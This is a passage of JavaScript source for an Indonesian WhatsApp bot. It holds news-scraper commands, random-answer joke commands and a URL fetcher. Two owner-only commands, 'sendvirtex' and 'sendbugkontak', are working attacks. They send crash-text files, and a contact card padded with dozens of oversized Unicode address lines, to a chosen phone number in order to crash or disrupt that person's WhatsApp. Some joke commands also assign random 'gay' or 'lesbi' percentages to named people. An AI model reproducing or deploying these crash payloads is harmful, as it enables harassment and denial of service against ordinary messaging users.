teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
reply(teks) 
})

break
case 'temponews':
TempoNews().then(async(res) => {

no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
miku.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break
case 'antaranews':
AntaraNews().then(async(res) => {

no = 0
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
for (let i of res) {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Berita: ${i.berita}\n`
teks += `Upload: ${i.berita_diupload}\n`
teks += `Jenis: ${i.berita_jenis}\n`
teks += `Link: ${i.berita_url}\n`
}
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
miku.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

})

break

case "kontannews":
  KontanNews().then(async (res) => {
    
    teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
    no = 0
    for (let i of res) {
      no += 1
      teks += `\n• ${no.toString()} •\n`
      teks += `Berita: ${i.berita}\n`
      teks += `Jenis: ${i.berita_jenis}\n`
      teks += `Upload: ${i.berita_diupload}\n`
      teks += `Link: ${i.berita_url}\n`
    }
    teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
    miku.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

  })
  
break
case "merdekanews":
  MerdekaNews().then(async (res) => {
    
    teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
    no = 0
    for (let i of res) {
      no += 1
      teks += `\n• ${no.toString()} •\n`
      teks += `Berita: ${i.berita}\n`
      teks += `Upload: ${i.berita_diupload}\n`
      teks += `Link: ${i.berita_url}\n`
    }
    teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
    miku.sendMessage(m.chat, { image : { url : res[0].berita_thumb }, caption: teks }, { quoted : m })

  })
  
break

case "jalantikus":
  var res = await JalanTikusMeme()
teks = ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
teks += "\nNgakak?\n"
teks += `\nSource: ${res}\n`
teks += ".•♫•♬.•♫••♬•♫•.•♬•♫•.•♫•♬.•♫••♬•♫•.•♬•♫•."
miku.sendMessage(m.chat, { image : { url : res }, caption: teks }, { quoted : m })


break
            case 'inews':
            a = await xfarr.information.inews()
result = await a.map(v => {
return `*• Berita :* ${v.berita}\n*• Upload :* ${v.upload_time}\n*• Link :* ${v.link}\n*• Thumb :* ${v.thumbnail}\n*• Info :* ${v.info_berita}`
}).join`\n\n`
miku.sendMessage(m.chat, { image: { url: a[0].thumbnail }, caption: `${result}` }, { quoted: m})
break

case 'kompas':
            a = await xfarr.information.kompasnews()
result = await a.map(v => {
return `*• Berita :* ${v.berita}\n*• Upload :* ${v.upload_time}\n*• Link :* ${v.link}\n*• Type berita  ${v.type_berita}\n*• Thumb :* ${v.thumbnail}\n*• Info :* ${v.info_berita}`
}).join`\n\n`
miku.sendMessage(m.chat, { image: { url: a[0].thumbnail }, caption: `${result}` }, { quoted: m})
break

case 'fetch': case 'get': {
			try {
			if (!/^https?:\/\//.test(text)) return m.reply('Awali URL dengan http:// atau https://')
			let res = await fetch(isUrl(text)[0])
			if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
				delete res
				throw `Content-Length: ${res.headers.get('content-length')}`
			}
			if (!/text|json/.test(res.headers.get('content-type'))) return miku.sendFile(m.chat, isUrl(text)[0], 'file', '', m)
			txtx = await res.buffer()
			try {
				txtx = util.format(JSON.parse(txtx+''))
			} catch (e) {
				txtx = txtx + ''
			} finally {
				m.reply(txtx.slice(0, 65536) + '')
			}
			} catch(err) {
				return m.reply(err)
			}
		}
		break
  case 'sendvirtex':
  case 'sv':
				reply("Sukses Mengirim Virtex")
  if (!isCreator) return m.reply(mess.owner)
  if (!args[1].includes('62')) return reply(`Masukan Nomer mulai dari 62`)
  miku.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('./1.txt')})
  miku.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('./2.txt')})
  miku.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('./3.txt')})
  miku.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('./4.txt')})
  miku.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('./virtex.txt')})
  miku.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('./1.txt')})
  miku.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('./2.txt')})
  miku.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('./3.txt')})
  miku.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('./4.txt')})
  miku.sendMessage(`${q}@s.whatsapp.net`, {text: fs.readFileSync('./virtex.txt')})
  break
case 'sendbugkontak':    
 if (!isCreator) return m.reply(mess.owner)
if (args.length < 1) return m.reply(`Penggunaan ${prefix}sendbug nomor`)
if (args[0].startsWith('08')) return m.reply('Gunakan kode negara kak')
let pc = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`               
if(pc === Ownerin) return m.reply("Tidak bisa, karena itu nomer developer")                  
 try {                 
m.reply('*Loading...*')        
let inilist = []
for (let i of ownerNumber) {
const vname = await miku.getName(pc)
inilist.push({"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${miku.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\n+ \nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇??𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇??𝑈𝐾??𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆?? ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ ??𝑆????𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈??𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻??𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆??𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶??𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻??𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆??𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇??𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇??𝑈𝐾??𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆?? ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ ??𝑆????𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈??𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻??𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆??𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶??𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻??𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆??𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇??𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇??𝑈𝐾??𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆?? ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ ??𝑆????𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈??𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻??𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆??𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶??𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻??𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆??𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇??𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇??𝑈𝐾??𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆?? ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ ??𝑆????𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈??𝐴𝑆𝐴 ボ ??𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻??𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆??𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ ??𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶??𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ??ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻𝐴?? 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆𝑈𝐾𝐴𝑆𝐴 ボ 𝐶𝐻??𝑁 〽️\nADR;TYPE=WORK:HOME;WHATSAPP.NET:ꪶ𖣂ꫂ 𝑇𝑆??𝐾𝐴??𝐴 ボ 𝐶𝐻𝐴𝑁 〽️\nitem1.X-ABLabel:Ponsel\nEND:VCARD`})}
console.log(inilist)
//await miku.sendMessage(`${pc}@s.whatsapp.net`, {"displayName": `${inilist.length} kontak`,"contacts": inilist }, 'contactsArrayMessage')
await miku.sendMessage(pc, { contacts: { displayName: `${inilist.length} Kontak`, contacts: inilist } })
console.log(color("[BUG]", "red"), color(moment.tz('Asia/Jakarta').format('HH:mm'), "green"), color('Bug terkirim', 'cyan'))
await miku.sendMessage(from,{ text: `*Sukses send bug bug ke nomor ${q}*`})
} catch (err) {
m.reply(err)
m.reply(`*Gagal mengirim bug!* \n*System Error*\nPastikan jaringan stabil dan masukan nomer whatsapp dengan benar`)
}   
break
case 'apakah':{
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const apa = ['Iya', 'Tidak', 'Bisa Jadi', 'Betul']
					const kah = apa[Math.floor(Math.random() * apa.length)]
miku.sendMessage(from, { text: `Pertanyaan : Apakah ${q}\nJawaban : ${kah}` }, { quoted: m })
}
					break
case 'bisakah':
  case 'bisa':
    case 'bisagak':{
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const bisa = ['Bisa','Gak Bisa','Gak Bisa Ajg Aowkawok','TENTU PASTI KAMU BISA!!']
					const ga = bisa[Math.floor(Math.random() * bisa.length)]
miku.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ga}` }, { quoted: m })
}
					break
case 'bagaimanakah':
  case 'gimanakah':
    case 'gimana':{
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} saya wibu`)
					const gimana = ['Gak Gimana2', 'Sulit Itu Bro', 'Maaf Bot Tidak Bisa Menjawab', 'Coba Deh Cari Di Gugel','astaghfirallah Beneran???','Pusing ah','Owhh Begitu:(','Yang Sabar Ya Bos:(','Gimana yeee']
					const ya = gimana[Math.floor(Math.random() * gimana.length)]
miku.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : ${ya}` }, { quoted: m })
}
					break
case 'rate':{
				if (!q) return reply(`Penggunaan ${command} text\n\nContoh : ${command} Gambar aku`)
					const ra = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const te = ra[Math.floor(Math.random() * ra.length)]
miku.sendMessage(from, { text: `Rate : ${q}\nJawaban : *${te}%*` }, { quoted: m })
}
					break
case 'gantengcek':
  case 'cekganteng':{
				if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
					const gan = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const teng = gan[Math.floor(Math.random() * gan.length)]
miku.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${teng}%*` }, { quoted: m })
}
					break
case 'cantikcek':
  case 'cekcantik':{
				if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
					const can = ['5', '10', '15' ,'20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const tik = can[Math.floor(Math.random() * can.length)]
miku.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${tik}%*` }, { quoted: m })
}
					break
case 'sangecek':
  case 'ceksange':
    case 'gaycek':
      case 'cekgay':
        case 'lesbicek':
          case 'ceklesbi':{
				if (!q) return reply(`Penggunaan ${command} Nama\n\nContoh : ${command} ${pushname}`)
					const sangeh = ['5', '10', '15','20', '25','30','35','40','45','50','55','60','65','70','75','80','85','90','100']
					const sange = sangeh[Math.floor(Math.random() * sangeh.length)]
miku.sendMessage(from, { text: `Nama : ${q}\nJawaban : *${sange}%*` }, { quoted: m })
}
					break
case 'kapankah':
  case 'kapan':{
				if (!q) return reply(`Penggunaan ${command} Pertanyaan\n\nContoh : ${command} Saya Mati`)
					const kapan = ['5 Hari Lagi', '10 Hari Lagi', '15 Hari Lagi','20 Hari Lagi', '25 Hari Lagi','30 Hari Lagi','35 Hari Lagi','40 Hari Lagi','45 Hari Lagi','50 Hari Lagi','55 Hari Lagi','60 Hari Lagi','65 Hari Lagi','70 Hari Lagi','75 Hari Lagi','80 Hari Lagi','85 Hari Lagi','90 Hari Lagi','100 Hari Lagi','5 Bulan Lagi', '10 Bulan Lagi', '15 Bulan Lagi','20 Bulan Lagi', '25 Bulan Lagi','30 Bulan Lagi','35 Bulan Lagi','40 Bulan Lagi','45 Bulan Lagi','50 Bulan Lagi','55 Bulan Lagi','60 Bulan Lagi','65 Bulan Lagi','70 Bulan Lagi','75 Bulan Lagi','80 Bulan Lagi','85 Bulan Lagi','90 Bulan Lagi','100 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','Besok','Lusa',`Abis Command Ini Juga Lu ${q}`]
					const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
miku.sendMessage(from, { text: `Pertanyaan : ${q}\nJawaban : *${kapankah}*` }, { quoted: m })
}
					break
case 'dsb':
			hit_global = []
			hit_user = []
			//globalhit
			dhit_global = await db.showdata('hit')
			filt_global = dhit_global.map(res => res.cmd)
			nar_global = new Set(filt_global);
			cmd_global = [...nar_global]
			for (let i of cmd_global) {
				try {
					filtc_global = await dhit_global.filter(hcm => hcm.cmd === i)
					hit_global.push({
						cmd: i,
						hit: filtc_global.length
					})
				} catch {}
			}
			hglobal = hit_global.sort(function(a, b) {
				return b.hit - a.hit
			})
			//userhit
			dhit_user = await db.showdata('hit', {
				sender: sender
			})
			filt_user = dhit_user.map(res => res.cmd)
			nar_user = new Set(filt_user);
			cmd_user = [...nar_user]
			for (let i of cmd_user) {
				try {
					filtc_user = await dhit_user.filter(hcm => hcm.cmd === i)
					hit_user.push({
						cmd: i,
						hit: filtc_user.length
					})
				} catch {}
			}
			huser = hit_user.sort(function(a, b) {
				return b.hit - a.hit
			})
			tg = ''
			if (huser.length < 6) {
				for (let i = 0; i < huser.length; i++) {
					tu += `› ${prefix}${huser[i].cmd} : ${huser[i].hit}\n`
				}
			} else {
				for (let i = 0; i < 6; i++) {
					tu += `› ${prefix}${huser[i].cmd} : ${huser[i].hit}\n`
				}
			}
			var dashh = `*DASHBOARD*

*HIT*
› Global : ${dhit_global.length}
› User : ${dhit_user.length}

*MOST COMMAND GLOBAL*
${tg}
*MOST COMMAND USER*
${tu}`
			reply(dashh)
			break
             //anime
             case 'chitanda':
             m.reply(mess.wait)
             lahh = await fetchJson('https://raw.githubusercontent.com/itsrival/Resultrestapi/main/random%20anime/chitanda.json')
